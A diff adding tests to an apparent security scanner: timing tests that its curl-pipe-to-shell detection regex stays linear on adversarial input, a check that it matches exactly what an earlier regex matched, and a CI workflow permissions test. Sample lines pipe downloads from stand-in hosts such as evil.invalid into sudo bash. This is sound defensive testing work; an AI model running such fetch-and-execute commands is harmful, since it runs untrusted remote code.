@@ -120,6 +120,56 @@ def test_hardened_pattern_is_fast_on_adversarial_line(label, pattern, text):
     assert elapsed < BUDGET, f"{label}: {elapsed:.2f}s"
 
 
+def test_curl_pipe_sudo_flags_stay_linear_far_past_the_window():
+    # The repetition CodeQL's py/redos names ('!\x7f-'), unwindowed and 50 times
+    # longer than any single search normally sees, with no shell at the end so
+    # every way of splitting the flags would be tried by a backtracking match.
+    for unit in ("!\x7f-", "-!\x7f ", "-a\t", "- "):
+        text = "curl x | sudo -" + unit * (50 * MAX_SCAN_LINE // len(unit)) + " !"
+        elapsed = _timed(lambda text=text: CURL_PIPE_SHELL_RE.search(text))
+        assert elapsed < BUDGET, f"{unit!r}: {elapsed:.2f}s"
+
+
+def test_curl_pipe_matches_exactly_what_the_previous_spelling_matched():
+    import random
+
+    previous = re.compile(
+        r"\b(?:curl|wget|fetch)\s+[^\s|][^\n|]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:ba|z)?sh\b",
+        re.IGNORECASE,
+    )
+    pieces = ["curl", "wget", "fetch", "sudo", "sh", "bash", "zsh", "|", "-", "--x", "-E"]
+    pieces += [" ", "\t", " ", " ", "\x7f", "!", "a", "\n", "SUDO", "Sh"]
+    rng = random.Random(20261024)
+    samples = [
+        "curl https://x.invalid/i.sh | sudo -E bash",
+        "curl x | sudo --preserve-env -H sh",
+        "curl x | sudo -u root sh",
+        "curl x | sudo - sh",
+        "wget -qO- x |sudo -E zsh",
+    ]
+    samples += ["".join(rng.choice(pieces) for _ in range(rng.randint(1, 30))) for _ in range(3000)]
+    # Mostly well-formed pipes, so many samples reach the sudo flags.
+    samples += [
+        "curl x |"
+        + "".join(rng.choice(pieces[3:]) for _ in range(rng.randint(0, 12)))
+        + rng.choice(["sh", "bash", "zsh", " sh", "x"])
+        for _ in range(3000)
+    ]
+    # Sudo with flags, separators and stray tokens mixed.
+    flags = ["-E", "--x", "-!", "-\x7f", "-", "-a-b", "root", "!"]
+    spaces = [" ", "\t", " ", " ", "", "  "]
+    samples += [
+        "curl x | sudo"
+        + "".join(rng.choice(spaces) + rng.choice(flags) for _ in range(rng.randint(0, 6)))
+        + rng.choice(spaces)
+        + rng.choice(["sh", "bash", "-sh", "zsh!"])
+        for _ in range(3000)
+    ]
+    for text in samples:
+        old, new = previous.search(text), CURL_PIPE_SHELL_RE.search(text)
+        assert (old and old.span()) == (new and new.span()), repr(text)
+
+
 def test_long_lines_are_windowed_not_skipped():
     payload = "curl https://evil.invalid/x.sh | bash"
     line = " " * (MAX_SCAN_LINE * 3) + payload
@@ -250,6 +300,19 @@ def test_cicd_permissions_block_form_is_detected(tmp_path):
     ctx = _ctx(tmp_path, {".github/workflows/ci.yml": wf})
     hits = [f for f in cicd.CicdScanner().scan(ctx) if f.rule_id == "cicd.excessive-permissions"]
     assert [f.location.start_line for f in hits] == [2]
+
+
+def test_cicd_job_level_contents_write_is_least_privilege(tmp_path):
+    wf = (
+        "on: push\npermissions:\n  contents: read\n"
+        "jobs:\n  deploy:\n    permissions:\n      contents: write\n"
+        "    runs-on: ubuntu-latest\n"
+        "  other:\n    permissions: write-all\n    runs-on: ubuntu-latest\n"
+    )
+    ctx = _ctx(tmp_path, {".github/workflows/ci.yml": wf})
+    hits = [f for f in cicd.CicdScanner().scan(ctx) if f.rule_id == "cicd.excessive-permissions"]
+    # The job that needs contents: write is not reported; write-all still is.
+    assert [f.location.start_line for f in hits] == [10]
 
 
 def test_patterns_scan_of_hostile_file_finishes(tmp_path):
